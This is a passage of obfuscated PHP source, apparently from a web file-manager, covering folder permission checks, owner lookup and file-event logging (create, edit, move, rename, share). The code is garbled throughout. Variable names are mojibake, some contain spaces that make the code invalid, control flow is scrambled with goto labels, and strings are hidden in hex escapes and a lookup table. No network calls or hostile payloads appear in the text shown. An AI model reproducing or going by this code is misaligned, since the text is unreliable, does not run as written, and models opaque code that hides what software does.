array_merge($F¸Ó¢Ò¾Ö˜, $FÜÅŞÍ”§—); } $F¸Ó¢Ò¾Ö˜ = array_values(array_unique($F¸Ó¢Ò¾Ö˜)); foreach ($F¸Ó¢Ò¾Ö˜ as $E¾×ˆ¯Å—í) { $bí¿ëÅ¿ìœ = $føî™ßÀ¡™->getInfo($E¾×ˆ¯Å—í); $A çÑš³‡‰[] = $bí¿ëÅ¿ìœ[$F ÆËóß”œ[391]][$F ÆËóß”œ[369]]; $A§´º§”·õ[$E¾×ˆ¯Å—í] = $bí¿ëÅ¿ìœ[$F ÆËóß”œ[391]][$F ÆËóß”œ[369]]; $Fß—ò›£ğ›[$E¾×ˆ¯Å—í] = $D×É«ŠÉ”ß->parentLevelArray($bí¿ëÅ¿ìœ[$F ÆËóß”œ[459]]); } goto BšÔÎ–ÄßÏ; a‘àâãÓÓö: if ($FÔˆğï·®÷) { $A®©ì”èÅ = array(array($F ÆËóß”œ[371] => SourceModel::TYPE_USER, $F ÆËóß”œ[456] => USER_ID), array($F ÆËóß”œ[371] => SourceModel::TYPE_GROUP, $F ÆËóß”œ[456] => array($F ÆËóß”œ[384], $FÔˆğï·®÷)), $F ÆËóß”œ[908] => $F ÆËóß”œ[2181]); } if ($FäİÊ¨) { $A®©ì”èÅ = array($A®©ì”èÅ, $F ÆËóß”œ[2230] => array($F ÆËóß”œ[2260], $FäİÊ¨)); } $c–ÃÕ³„¿ï = $this->field($F ÆËóß”œ[2261])->where($A®©ì”èÅ)->select(); goto Eë§â˜½ÒÑ; Eë§â˜½ÒÑ: $A¯Ò‰ÈíÔ¡ = array_to_keyvalue($c–ÃÕ³„¿ï, $F ÆËóß”œ[33], $F ÆËóß”œ[369]); $A çÑš³‡‰ = array(); $F¸Ó¢Ò¾Ö˜ = $FÔˆğï·®÷; goto EŞ¤˜†¸ñ; c­ ÂÇŞ½½: return $Dƒ·ø æé; goto aÏ¥¹·ä÷‚; aÏ¥¹·ä÷‚: } private function makeSourceAuth($bÇ©…‰²Ôñ, $bÑí·…ÖÄù) { goto Bù–»«¬à; c¯²äÁó¯: $D±÷ í ë‰ = !1; foreach ($e¡µ÷¥ÑŸ as $B§øò‚Áµ) { if (!isset($bÑí·…ÖÄù[$B§øò‚Áµ])) { continue; } $e‚šó«„–Í = $this->authMake($bÑí·…ÖÄù[$B§øò‚Áµ]); if ($e‚šó«„–Í[$Bš†Ö‰ƒÒ¼[418]]) { $D±÷ í ë‰ = $e‚šó«„–Í; break; } } if (!$BÃˆºïâŠ) { return $D±÷ í ë‰; } goto cïÓÖÕ’áá; eßäÊ¾ÛñÄ: $BˆùÂ·¹ˆó = $Bš†Ö‰ƒÒ¼[83]; $e¡µ÷¥ÑŸ = Model($Bš†Ö‰ƒÒ¼[1111])->parentLevelArray($bÇ©…‰²Ôñ[$Bš†Ö‰ƒÒ¼[459]]); $e¡µ÷¥ÑŸ = array_merge(array($bÇ©…‰²Ôñ[$Bš†Ö‰ƒÒ¼[369]]), array_reverse($e¡µ÷¥ÑŸ)); goto A»Ò·•Ú; cïÓÖÕ’áá: if (!$D±÷ í ë‰ && isset($bÌâ¾‹õº¨[$BÓŠÂ·„”])) { $DòÊŒˆ…¿ê = $bÌâ¾‹õº¨[$BÓŠÂ·„”]; $A©×ÆÀÀ™Ø = Model($Bš†Ö‰ƒÒ¼[458])->getInfo($BÓŠÂ·„”); $D±÷ í ë‰ = array($Bš†Ö‰ƒÒ¼[2262] => intval($DòÊŒˆ…¿ê[$Bš†Ö‰ƒÒ¼[376]][$Bš†Ö‰ƒÒ¼[376]]), $Bš†Ö‰ƒÒ¼[2263] => $DòÊŒˆ…¿ê[$Bš†Ö‰ƒÒ¼[376]], $Bš†Ö‰ƒÒ¼[2257] => array($Bš†Ö‰ƒÒ¼[388] => $Bš†Ö‰ƒÒ¼[2267], $Bš†Ö‰ƒÒ¼[75] => $A©×ÆÀÀ™Ø[$Bš†Ö‰ƒÒ¼[391]][$Bš†Ö‰ƒÒ¼[369]], $Bš†Ö‰ƒÒ¼[2266] => $A©×ÆÀÀ™Ø[$Bš†Ö‰ƒÒ¼[463]])); } if (!$D±÷ í ë‰) { $A©×ÆÀÀ™Ø = Model($Bš†Ö‰ƒÒ¼[458])->getInfo($BÓŠÂ·„”); $F†‹ª‰Ü¨ = explode($Bš†Ö‰ƒÒ¼[47], trim($A©×ÆÀÀ™Ø[$Bš†Ö‰ƒÒ¼[459]], $Bš†Ö‰ƒÒ¼[47])); foreach ($F†‹ª‰Ü¨ as $fÄ‘¦Ôªµ) { if ($fÄ‘¦Ôªµ == $Bš†Ö‰ƒÒ¼[468] || $fÄ‘¦Ôªµ == $BˆùÂ·¹ˆó) { continue; } if (!isset($bÌâ¾‹õº¨[$fÄ‘¦Ôªµ])) { continue; } $DòÊŒˆ…¿ê = $bÌâ¾‹õº¨[$fÄ‘¦Ôªµ]; $D±÷ í ë‰ = array($Bš†Ö‰ƒÒ¼[2262] => intval($DòÊŒˆ…¿ê[$Bš†Ö‰ƒÒ¼[376]][$Bš†Ö‰ƒÒ¼[376]]), $Bš†Ö‰ƒÒ¼[2263] => $DòÊŒˆ…¿ê[$Bš†Ö‰ƒÒ¼[376]], $Bš†Ö‰ƒÒ¼[2257] => array($Bš†Ö‰ƒÒ¼[388] => $Bš†Ö‰ƒÒ¼[2264], $Bš†Ö‰ƒÒ¼[2265] => $A©×ÆÀÀ™Ø[$Bš†Ö‰ƒÒ¼[391]][$Bš†Ö‰ƒÒ¼[369]], $Bš†Ö‰ƒÒ¼[2266] => $A©×ÆÀÀ™Ø[$Bš†Ö‰ƒÒ¼[463]])); break; } } if (!$D±÷ í ë‰ || $D±÷ í ë‰[$Bš†Ö‰ƒÒ¼[377]] <= 0) { $F‹¿¾±¯¢· = $this->authDeepCheck($bÇ©…‰²Ôñ[$Bš†Ö‰ƒÒ¼[369]]); if ($F‹¿¾±¯¢·) { $D±÷ í ë‰ = $F‹¿¾±¯¢·; } } goto C’Ò“°Ä; A»Ò·•Ú: $BÓŠÂ·„” = $bÇ©…‰²Ôñ[$Bš†Ö‰ƒÒ¼[456]]; $BÃˆºïâŠ = $bÇ©…‰²Ôñ[$Bš†Ö‰ƒÒ¼[371]] == SourceModel::TYPE_GROUP; if ($BÃˆºïâŠ && isset($bÌâ¾‹õº¨[$BÓŠÂ·„”]) && !_get($GLOBALS, $Bš†Ö‰ƒÒ¼[457])) { $DòÊŒˆ…¿ê = $bÌâ¾‹õº¨[$BÓŠÂ·„”]; if (Model($Bš†Ö‰ƒÒ¼[2249])->authCheckRoot($DòÊŒˆ…¿ê[$Bš†Ö‰ƒÒ¼[376]][$Bš†Ö‰ƒÒ¼[376]])) { $A©×ÆÀÀ™Ø = Model($Bš†Ö‰ƒÒ¼[458])->getInfo($BÓŠÂ·„”); $D±÷ í ë‰ = array($Bš†Ö‰ƒÒ¼[2262] => intval($DòÊŒˆ…¿ê[$Bš†Ö‰ƒÒ¼[376]][$Bš†Ö‰ƒÒ¼[376]]), $Bš†Ö‰ƒÒ¼[2263] => $DòÊŒˆ…¿ê[$Bš†Ö‰ƒÒ¼[376]], $Bš†Ö‰ƒÒ¼[2257] => array($Bš†Ö‰ƒÒ¼[388] => $Bš†Ö‰ƒÒ¼[2264], $Bš†Ö‰ƒÒ¼[2265] => $A©×ÆÀÀ™Ø[$Bš†Ö‰ƒÒ¼[391]][$Bš†Ö‰ƒÒ¼[369]], $Bš†Ö‰ƒÒ¼[2266] => $A©×ÆÀÀ™Ø[$Bš†Ö‰ƒÒ¼[463]])); return $D±÷ í ë‰; } } goto c¯²äÁó¯; Bù–»«¬à: $Bš†Ö‰ƒÒ¼ =& $_SERVER[îÖ]; $bÌâ¾‹õº¨ = Session::get($Bš†Ö‰ƒÒ¼[2214]); $bÌâ¾‹õº¨ = array_to_keyvalue($bÌâ¾‹õº¨, $Bš†Ö‰ƒÒ¼[2099]); goto eßäÊ¾ÛñÄ; C’Ò“°Ä: return $D±÷ í ë‰; goto BòÃĞÍ˜; BòÃĞÍ˜: } public function authOwnerApply($EŸˆêÕ¬ŒÈ) { goto A„­œ¦»«Ñ; EªÆÆ¬¤‡: $Aù‡ÏĞÈÍ = array($E½áâ÷†Œ[383] => array($E½áâ÷†Œ[384], $cŠ–Ñù²çÜ)); $BÕà×µß› = $this->field($DªÔ„œÌÏí)->where($Aù‡ÏĞÈÍ)->select(); $BÕà×µß› = array_to_keyvalue_group($BÕà×µß›, $E½áâ÷†Œ[369]); goto FŠ¹ÒŠ†Ïˆ; b¤Õ¢²ìóø: $cŠ–Ñù²çÜ = Model($E½áâ÷†Œ[1111])->parentLevelArray($EŸˆêÕ¬ŒÈ[$E½áâ÷†Œ[459]]); $cŠ–Ñù²çÜ = array_merge(array($EŸˆêÕ¬ŒÈ[$E½áâ÷†Œ[369]]), array_reverse($cŠ–Ñù²çÜ)); $DªÔ„œÌÏí = $E½áâ÷†Œ[2252]; goto EªÆÆ¬¤‡; A„­œ¦»«Ñ: $E½áâ÷†Œ =& $_SERVER[îÖ]; if (empty($EŸˆêÕ¬ŒÈ[$E½áâ÷†Œ[376]]) || isset($EŸˆêÕ¬ŒÈ[$E½áâ÷†Œ[2268]]) && $EŸˆêÕ¬ŒÈ[$E½áâ÷†Œ[2268]]) { return $EŸˆêÕ¬ŒÈ; } if (AuthModel::authCheckRoot($EŸˆêÕ¬ŒÈ[$E½áâ÷†Œ[376]][$E½áâ÷†Œ[377]])) { return $EŸˆêÕ¬ŒÈ; } goto b¤Õ¢²ìóø; FŠ¹ÒŠ†Ïˆ: $A©òºÉÂÚ¬ = array(); $bÙ æí¹™ = array(); foreach ($BÕà×µß› as $fÙÌ®ãæô => $aØšÕÈ²Ã‚) { $CŸ¡§Ò° = $this->authFolderOwnerUser($aØšÕÈ²Ã‚); $A©òºÉÂÚ¬[$fÙÌ®ãæô] = $CŸ¡§Ò°; $bÙ æí¹™ = array_merge($bÙ æí¹™, $CŸ¡§Ò°[$E½áâ÷†Œ[535]]); if ($CŸ¡§Ò°[$E½áâ÷†Œ[2269]]) { break; } } goto bòá¦ªœ¯Ä; d¥ÃÆïåäê: $EŸˆêÕ¬ŒÈ[$E½áâ÷†Œ[376]][$E½áâ÷†Œ[2270]] = Model($E½áâ÷†Œ[474])->userListInfo($bÙ æí¹™); return $EŸˆêÕ¬ŒÈ; goto fÏšÅ‚¶ ó; bòá¦ªœ¯Ä: if (count($bÙ æí¹™) == 0) { $bÙ æí¹™ = $this->authFolderOwnerGroup($EŸˆêÕ¬ŒÈ[$E½áâ÷†Œ[456]]); } $bÙ æí¹™ = array_unique($bÙ æí¹™); if (AuthModel::authCheckRoot($EŸˆêÕ¬ŒÈ[$E½áâ÷†Œ[376]][$E½áâ÷†Œ[377]])) { $bÙ æí¹™[] = USER_ID; } goto d¥ÃÆïåäê; fÏšÅ‚¶ ó: } private function authFolderOwnerGroup($FµÊİ¸—óò) { $e«‘¨ÁÜ =& $_SERVER[îÖ]; $C¡‰ëÑë‡© = Model($e«‘¨ÁÜ[2175])->where(array($e«‘¨ÁÜ[2099] => $FµÊİ¸—óò))->select(); $cÄÏ¡°¾‹Ö = array(); if (!$C¡‰ëÑë‡©) { return $cÄÏ¡°¾‹Ö; } foreach ($C¡‰ëÑë‡© as $bÜ­×­¼¡—) { $F¨ä„Å÷Â = $this->authInfo($bÜ­×­¼¡—); if (AuthModel::authCheckRoot($F¨ä„Å÷Â[$e«‘¨ÁÜ[376]])) { $cÄÏ¡°¾‹Ö[] = $bÜ­×­¼¡—[$e«‘¨ÁÜ[1431]]; } } return $cÄÏ¡°¾‹Ö; } private function authFolderOwnerUser($F°ƒ²Æ’) { $DÆÚã Í¼ñ =& $_SERVER[îÖ]; $e„—ö‰»Ë½ = array(); $dÑ¬¡’¯†Ş = !1; foreach ($F°ƒ²Æ’ as $FÛ…›æ•ƒ) { $aõ‚ŸÎ¢ó = $this->authInfo($FÛ…›æ•ƒ); if ($FÛ…›æ•ƒ[$DÆÚã Í¼ñ[456]] == $DÆÚã Í¼ñ[468]) { $dÑ¬¡’¯†Ş = !0; } if ($FÛ…›æ•ƒ[$DÆÚã Í¼ñ[371]] == SourceModel::TYPE_USER) { if (AuthModel::authCheckRoot($aõ‚ŸÎ¢ó[$DÆÚã Í¼ñ[376]])) { $e„—ö‰»Ë½[] = $FÛ…›æ•ƒ[$DÆÚã Í¼ñ[456]]; } } } return array($DÆÚã Í¼ñ[535] => $e„—ö‰»Ë½, $DÆÚã Í¼ñ[2269] => $dÑ¬¡’¯†Ş); } public function authMake($e¥ÃÃ‹‰Ñ) { goto cŠÂõÜÈïé; C‡Îª¬Ï‚: $A³ƒÆ©„ºÜ = 0; $Bé¸ä…ì = 0; $fÄš›¡ßÆ‹ = 0; goto Dë§½×ÑÌ; DÈïÙìÑğî: $aÁ†åÃã” = array($B³¢à„Ú[2262] => intval($Aàôã˜¢­Ñ), $B³¢à„Ú[2263] => $aŠĞ¶ÖøŠ„, $B³¢à„Ú[2257] => array($B³¢à„Ú[388] => $eÓÓ‹ŒÒĞ, $B³¢à„Ú[75] => $C’šó¥ãí¦[$B³¢à„Ú[369]])); return $aÁ†åÃã”; goto eë¥ìã; bÔŠ’›ŒçÏ: $Aàôã˜¢­Ñ = $Bé¸ä…ì ? $c—…§ÒÚÇ : ($fÄš›¡ßÆ‹ ? $dÓ…–©¿¤ª : $DÜªï¯—ëĞ); $aŠĞ¶ÖøŠ„ = $Bé¸ä…ì ? $cØñ ½²‡… : ($fÄš›¡ßÆ‹ ? $b‘ë´“Õ‡ã : $A³ƒÆ©„ºÜ); $eÓÓ‹ŒÒĞ = $Bé¸ä…ì ? $B³¢à„Ú[2271] : ($fÄš›¡ßÆ‹ ? $B³¢à„Ú[2272] : ($aì«„È¨ğ ? $B³¢à„Ú[2273] : $B³¢à„Ú[361])); goto DÈïÙìÑğî; E¹ï„¶èåŒ: $DÜªï¯—ëĞ = 0; $cØñ ½²‡… = 0; $b‘ë´“Õ‡ã = 0; goto C‡Îª¬Ï‚; cŠÂõÜÈïé: $B³¢à„Ú =& $_SERVER[îÖ]; if (!$e¥ÃÃ‹‰Ñ) { return array($B³¢à„Ú[377] => 0, $B³¢à„Ú[418] => !1); } $b¡£ÉÚÄ– = Session::get($B³¢à„Ú[2214]); goto cËëù£„…à; Dë§½×ÑÌ: $aì«„È¨ğ = 0; $C’šó¥ãí¦ = array($B³¢à„Ú[369] => 0); foreach ($e¥ÃÃ‹‰Ñ as $C’šó¥ãí¦) { $aŠĞ¶ÖøŠ„ = $this->authInfo($C’šó¥ãí¦); $C‹ÌËÙÉö’ = $C’šó¥ãí¦[$B³¢à„Ú[456]]; $F¬Ÿªƒ½•Ô = intval($aŠĞ¶ÖøŠ„[$B³¢à„Ú[376]]); if ($C’šó¥ãí¦[$B³¢à„Ú[371]] == SourceModel::TYPE_USER && $C‹ÌËÙÉö’ == USER_ID) { $Bé¸ä…ì = !0; $cØñ ½²‡… = $aŠĞ¶ÖøŠ„; $c—…§ÒÚÇ = $F¬Ÿªƒ½•Ô; } else { if ($C’šó¥ãí¦[$B³¢à„Ú[371]] == SourceModel::TYPE_GROUP && in_array($C‹ÌËÙÉö’, $C½–Šù’Í”)) { $fÄš›¡ßÆ‹ = !0; if ($F¬Ÿªƒ½•Ô >= $dÓ…–©¿¤ª) { $dÓ…–©¿¤ª = $F¬Ÿªƒ½•Ô; $b‘ë´“Õ‡ã = $aŠĞ¶ÖøŠ„; } } else { if ($C‹ÌËÙÉö’ == $B³¢à„Ú[468]) { $aì«„È¨ğ = !0; $A³ƒÆ©„ºÜ = $aŠĞ¶ÖøŠ„; $DÜªï¯—ëĞ = $F¬Ÿªƒ½•Ô; } } } } goto bÔŠ’›ŒçÏ; cËëù£„…à: $C½–Šù’Í” = array_to_keyvalue($b¡£ÉÚÄ–, $B³¢à„Ú[33], $B³¢à„Ú[2099]); $c—…§ÒÚÇ = 0; $dÓ…–©¿¤ª = 0; goto E¹ï„¶èåŒ; eë¥ìã: } public function authTargetInfoMake($c°ëÎŸğå¥) { goto a­°–‚£´ë; a­°–‚£´ë: $e¢Û«‚Ô¾Ù =& $_SERVER[îÖ]; $D‡¦œ–á„Œ = array(); $a¹â«æ¾ÇÊ = array(); goto e‰ßÁâƒô¡; e‰ßÁâƒô¡: foreach ($c°ëÎŸğå¥ as $dêÕ‰ÏÎö‹) { if ($dêÕ‰ÏÎö‹[$e¢Û«‚Ô¾Ù[371]] == SourceModel::TYPE_USER) { $D‡¦œ–á„Œ[] = intval($dêÕ‰ÏÎö‹[$e¢Û«‚Ô¾Ù[456]]); } else { if ($dêÕ‰ÏÎö‹[$e¢Û«‚Ô¾Ù[371]] == SourceModel::TYPE_GROUP) { $a¹â«æ¾ÇÊ[] = intval($dêÕ‰ÏÎö‹[$e¢Û«‚Ô¾Ù[456]]); } } } if ($D‡¦œ–á„Œ) { $D‡¦œ–á„Œ = Model($e¢Û«‚Ô¾Ù[474])->userListInfo($D‡¦œ–á„Œ); } if ($a¹â«æ¾ÇÊ) { $EÛòõäÚšö = array($e¢Û«‚Ô¾Ù[2173] => array($e¢Û«‚Ô¾Ù[384], $a¹â«æ¾ÇÊ)); $a¹â«æ¾ÇÊ = Model($e¢Û«‚Ô¾Ù[458])->field($e¢Û«‚Ô¾Ù[2186])->where($EÛòõäÚšö)->select(); $a¹â«æ¾ÇÊ = array_to_keyvalue($a¹â«æ¾ÇÊ, $e¢Û«‚Ô¾Ù[2099]); } goto fõâ‹ÄëçÓ; fõâ‹ÄëçÓ: return array($e¢Û«‚Ô¾Ù[2274] => $D‡¦œ–á„Œ, $e¢Û«‚Ô¾Ù[2266] => $a¹â«æ¾ÇÊ); goto aˆ»Á¢÷Êß; aˆ»Á¢÷Êß: } private function authInfo($B¶ï¦ÚÖñ›) { $Eö†àÖÃ =& $_SERVER[îÖ]; if ($B¶ï¦ÚÖñ›[$Eö†àÖÃ[2230]]) { $a“’¤¾ê”‰ = Model($Eö†àÖÃ[2249])->listData($B¶ï¦ÚÖñ›[$Eö†àÖÃ[2230]]); if (!$a“’¤¾ê”‰) { return !1; $c„¾ğ¯ÈÒ… = Model($Eö†àÖÃ[2249])->listData(); $eŠö¾›õŒâ = array_filter_by_field($c„¾ğ¯ÈÒ…, $Eö†àÖÃ[376], $Eö†àÖÃ[468]); return $eŠö¾›õŒâ; } $AÕ‡Ğ¦ğ = array_field_key($a“’¤¾ê”‰, array($Eö†àÖÃ[367], $Eö†àÖÃ[28], $Eö†àÖÃ[376], $Eö†àÖÃ[2117], $Eö†àÖÃ[2120])); $AÕ‡Ğ¦ğ[$Eö†àÖÃ[2275]] = $B¶ï¦ÚÖñ›; return $AÕ‡Ğ¦ğ; } else { return array($Eö†àÖÃ[385] => 0, $Eö†àÖÃ[2105] => $B¶ï¦ÚÖñ›[$Eö†àÖÃ[2231]], $Eö†àÖÃ[386] => $Eö†àÖÃ[33], $Eö†àÖÃ[2117] => $Eö†àÖÃ[2276]); } } } class SourceEventModel extends ModelBase { protected $tableName = "\x69\157\137\163\157\165\162\143\x65\x5f\x65\x76\145\x6e\164"; protected $dataAuto = array(array("\143\x72\145\x61\x74\x65\x54\151\x6d\145", "\164\151\155\145", "\151\156\163\145\x72\x74", "\146\165\156\x63\164\x69\157\156"), array("\x64\145\163\x63", '', "\151\x6e\x73\145\x72\164\54\x75\160\144\141\164\x65\x2c\163\x65\154\145\x63\x74", "\x6a\x73\157\156")); protected $eventSave = true; public function recodeStop() { $this->eventSave = !1; } public function recodeStart() { $this->eventSave = !0; } public function addEvent($BŸ¹š²â†˜, $Fö»Åİœ¨ä, $eİŠ»Çé½ = '') { goto aãÅÛ¶ßÖñ; A¾™®¢¾­ó: if (!$CğîÂ‘øòÌ) { return !1; } if ($this->isCacheEvent($CğîÂ‘øòÌ, $Fö»Åİœ¨ä)) { return; } if ($eİŠ»Çé½ && is_string($eİŠ»Çé½)) { $eİŠ»Çé½ = array($B•ÒìÂ·‚[2129] => $eİŠ»Çé½); } goto e·Ä¾óõ•Ş; aãÅÛ¶ßÖñ: $B•ÒìÂ·‚ =& $_SERVER[îÖ]; if (!$this->eventSave) { return; } $CğîÂ‘øòÌ = Model($B•ÒìÂ·‚[1111])->sourceInfo($BŸ¹š²â†˜); goto A¾™®¢¾­ó; e·Ä¾óõ•Ş: $AŸ¥¦£Ş´› = array($B•ÒìÂ·‚[383] => $BŸ¹š²â†˜, $B•ÒìÂ·‚[2277] => $CğîÂ‘øòÌ[$B•ÒìÂ·‚[461]], $B•ÒìÂ·‚[2278] => $CğîÂ‘øòÌ[$B•ÒìÂ·‚[28]], $B•ÒìÂ·‚[466] => $CğîÂ‘øòÌ[$B•ÒìÂ·‚[466]], $B•ÒìÂ·‚[1422] => USER_ID, $B•ÒìÂ·‚[388] => $Fö»Åİœ¨ä, $B•ÒìÂ·‚[1424] => $eİŠ»Çé½); $this->addSystemLog($Fö»Åİœ¨ä, $AŸ¥¦£Ş´›); return $this->add($AŸ¥¦£Ş´›); goto c•Ø¶Í¹„î; c•Ø¶Í¹„î: } private function addSystemLog($Bã·Üî , $BÕ–‘ñ¤ˆñ) { $bÇèèÜÅ =& $_SERVER[îÖ]; if ($Bã·Üî  == $bÇèèÜÅ[2279]) { $Bã·Üî  = $BÕ–‘ñ¤ˆñ[$bÇèèÜÅ[405]][$bÇèèÜÅ[2280]]; } else { if (in_array($Bã·Üî , array($bÇèèÜÅ[2076], $bÇèèÜÅ[2281]))) { $Bã·Üî  = $BÕ–‘ñ¤ˆñ[$bÇèèÜÅ[405]][$bÇèèÜÅ[691]]; } } $A»ÏìÎ‘‰º = array_merge($BÕ–‘ñ¤ˆñ, array($bÇèèÜÅ[2282] => $BÕ–‘ñ¤ˆñ[$bÇèèÜÅ[369]], $bÇèèÜÅ[2283] => $BÕ–‘ñ¤ˆñ[$bÇèèÜÅ[2283]])); Model($bÇèèÜÅ[2039])->addLog($bÇèèÜÅ[2284] . $Bã·Üî , $A»ÏìÎ‘‰º); } private function isCacheEvent($E¡éÕèÆÑœ, $c¨ÆÌ«æÎ) { if ($E¡éÕèÆÑœ[$_SERVER[îÖ][371]] == SourceModel::TYPE_SYSTEM) { return !0; } return !1; } public function eventCreate($E“İ”ÀäƒØ, $DğÀæ‘É‰‹) { $cİÏ¿Ä‘ãù =& $_SERVER[îÖ]; $b¦ÄÛÃ¹Ã“ = Model($cİÏ¿Ä‘ãù[1111])->sourceInfo($E“İ”ÀäƒØ); $bïÇÑ‘¬ÔÅ = array($cİÏ¿Ä‘ãù[2280] => $DğÀæ‘É‰‹, $cİÏ¿Ä‘ãù[28] => $b¦ÄÛÃ¹Ã“[$cİÏ¿Ä‘ãù[28]]); return $this->addEvent($E“İ”ÀäƒØ, $cİÏ¿Ä‘ãù[2279], $bïÇÑ‘¬ÔÅ); } public function eventFileEdit($CŸìã‚ ) { $eâ·ñïØ =& $_SERVER[îÖ]; $bšî´Ä½Ÿ‚ = array($eâ·ñïØ[2285] => $_SERVER[$eâ·ñïØ[2286]], $eâ·ñïØ[1745] => strtolower(ACTION)); return $this->addEvent($CŸìã‚ , $eâ·ñïØ[2066], $bšî´Ä½Ÿ‚); } public function eventRecycle($a‡åªëòš¯, $Cğîô™’İ¬) { return $this->addEvent($a‡åªëòš¯, $_SERVER[îÖ][2281], $Cğîô™’İ¬); } public function eventRemove($e¯×óºöõ±) { $A‘à¸Ñ – =& $_SERVER[îÖ]; $CæÄ¢ÀÏ¢– = Model($A‘à¸Ñ –[1111])->sourceInfo($e¯×óºöõ±); $dÕ†Á†½Ôó = $CæÄ¢ÀÏ¢–[$A‘à¸Ñ –[28]]; return $this->addEvent($CæÄ¢ÀÏ¢–[$A‘à¸Ñ –[461]], $A‘à¸Ñ –[2065], $dÕ†Á†½Ôó); } public function eventShare($dÍôœ†‚Ş , $BÆ İ—ŞĞ) { return $this->addEvent($dÍôœ†‚Ş , $_SERVER[îÖ][2076], $BÆ İ—ŞĞ); } public function eventMove($fíœÍÊ¬²ß, $A¬ñóî‰§È, $D‰¿õ­´ƒÇ) { goto Dñ›ÎñÃµÂ; a¸¯·ĞåÓ: $this->addEvent($fíœÍÊ¬²ß, $bÖäø’¥×[492], $f¢‰ã…àÇ); $b’Ê¶¼‡  = $B×ÓÙï´‰Ü->sourceInfo($fíœÍÊ¬²ß); $f¢‰ã…àÇ = array($bÖäø’¥×[369] => $b’Ê¶¼‡ [$bÖäø’¥×[369]], $bÖäø’¥×[28] => $b’Ê¶¼‡ [$bÖäø’¥×[28]]); goto FÂ¬›İïïç; f×Ÿ·éƒ«¯: $b«íŠÙÎ = $B×ÓÙï´‰Ü->sourceInfo($A¬ñóî‰§È); $cİ¾³Ÿ‡—¹ = $B×ÓÙï´‰Ü->sourceInfo($D‰¿õ­´ƒÇ); $f¢‰ã…àÇ = array($bÖäø’¥×[1001] => $A¬ñóî‰§È, $bÖäø’¥×[2287] => $b«íŠÙÎ[$bÖäø’¥×[28]], $bÖäø’¥×[2288] => $b«íŠÙÎ[$bÖäø’¥×[466]], $bÖäø’¥×[1002] => $D‰¿õ­´ƒÇ, $bÖäø’¥×[2289] => $cİ¾³Ÿ‡—¹[$bÖäø’¥×[28]], $bÖäø’¥×[2290] => $cİ¾³Ÿ‡—¹[$bÖäø’¥×[466]]); goto a¸¯·ĞåÓ; FÂ¬›İïïç: $this->addEvent($A¬ñóî‰§È, $bÖäø’¥×[2291], $f¢‰ã…àÇ); goto B’¦…Âï‰¡; Dñ›ÎñÃµÂ: $bÖäø’¥× =& $_SERVER[îÖ]; $B×ÓÙï´‰Ü = Model($bÖäø’¥×[1111]); $b’Ê¶¼‡  = $B×ÓÙï´‰Ü->sourceInfo($fíœÍÊ¬²ß); goto f×Ÿ·éƒ«¯; B’¦…Âï‰¡: } public function eventCopy($eŠ—Òâò“’) { $this->eventCreate($eŠ—Òâò“’, $_SERVER[îÖ][490]); } public function eventRename($A‹®•ÒÄ½, $C‹ß®íø–‰, $F’µ½Äª“½) { $e‘ê³¬ŒÑ =& $_SERVER[îÖ]; $BÌìÅ¬¹å = array($e‘ê³¬ŒÑ[1001] => $C‹ß®íø–‰, $e‘ê³¬ŒÑ[1002] => $F’µ½Äª“½); return $this->addEvent($A‹®•ÒÄ½, $e‘ê³¬ŒÑ[1124], $BÌìÅ¬¹å); } public function eventAddComment($d·÷çóíá, $dÉÍ·ŒÆƒ) { return $this->addEvent($d·÷çóíá, $_SERVER[îÖ][2292], $dÉÍ·ŒÆƒ); } public function eventAddDesc($BÒ·òÆí‹æ, $AğÑñ¼ Í¦) { return $this->addEvent($BÒ·òÆí‹æ, $_SERVER[îÖ][2293], $AğÑñ¼ Í¦); } public function listBySource($cÀˆ‚Å§Ê) { goto f»óÇ¯é²õ; f»óÇ¯é²õ: $FîÛå™¡º =& $_SERVER[îÖ]; $C–£ß§å©“ = Model($FîÛå™¡º[1111])->sourceInfo($cÀˆ‚Å§Ê); $cÍîîÂğ¦ = array($FîÛå™¡º[383] => $cÀˆ‚Å§Ê); goto BÊˆƒªŠ“Œ; f¿áÑáâ: return $this->eventListParse($F˜Ø˜—‡ß, $cÀˆ‚Å§Ê); goto C¤£ù‰ùøò; BÊˆƒªŠ“Œ: if ($C–£ß§å©“[$FîÛå™¡º[370]] == $FîÛå™¡º[83]) { $d¾Ë’ÒøÂÈ = Model($FîÛå™¡º[1111])->listSearchChildren($cÀˆ‚Å§Ê, 20000); $d¾Ë’ÒøÂÈ[] = $cÀˆ‚Å§Ê . $FîÛå™¡º[361]; $cÍîîÂğ¦ = array($FîÛå™¡º[369] => array($FîÛå™¡º[7], $d¾Ë’ÒøÂÈ)); } $F˜Ø˜—‡ß = $this->where($cÍîîÂğ¦)->order($FîÛå™¡º[2294])->selectPage(); if ($F˜Ø˜—‡ß[$FîÛå™¡º[351]][$FîÛå™¡º[352]] == 0) { $F˜Ø˜—‡ß[$FîÛå™¡º[351]][$FîÛå™¡º[352]] = 1; $F˜Ø˜—‡ß[$FîÛå™¡º[354]] = array(array($FîÛå™¡º[383] => $cÀˆ‚Å§Ê, $FîÛå™¡º[2277] => $C–£ß§å©“[$FîÛå™¡º[461]], $FîÛå™¡º[1422] => $C–£ß§å©“[$FîÛå™¡º[378]], $FîÛå™¡º[388] => $FîÛå™¡º[2295], $FîÛå™¡º[389] => $C–£ß§å©“[$FîÛå™¡º[187]], $FîÛå™¡º[1424] => $FîÛå™¡º[33])); } goto f¿áÑáâ; C¤£ù‰ùøò: } private function eventListParse($A‘Á¼•»¸‰, $eåÛ›Ş³) { goto c›·›‹³ø²; d—±ë²·ƒ“: return $A‘Á¼•»¸‰; goto eïÖ¨¤íã©; DÒìˆÅÍ’À: $dÌŠÑ£…†¾ = array_to_keyvalue($f²Òª‘Îôµ, $f³ƒõËìÕ‰[33], $f³ƒõËìÕ‰[2283]); foreach ($f²Òª‘Îôµ as $Eæí¯Í¦Å) { $B‡¶î¹¹£ = $Eæí¯Í¦Å[$f³ƒõËìÕ‰[405]]; if ($Eæí¯Í¦Å[$f³ƒõËìÕ‰[29]] == $f³ƒõËìÕ‰[492] && isset($B‡¶î¹¹£[$f³ƒõËìÕ‰[1001]])) { $aÒÔš«ëò[] = $B‡¶î¹¹£[$f³ƒõËìÕ‰[1001]] . $f³ƒõËìÕ‰[33]; $aÒÔš«ëò[] = $B‡¶î¹¹£[$f³ƒõËìÕ‰[1002]] . $f³ƒõËìÕ‰[33]; } if ($Eæí¯Í¦Å[$f³ƒõËìÕ‰[29]] == $f³ƒõËìÕ‰[2291] && isset($B‡¶î¹¹£[$f³ƒõËìÕ‰[369]])) { $aÒÔš«ëò[] = $B‡¶î¹¹£[$f³ƒõËìÕ‰[369]] . 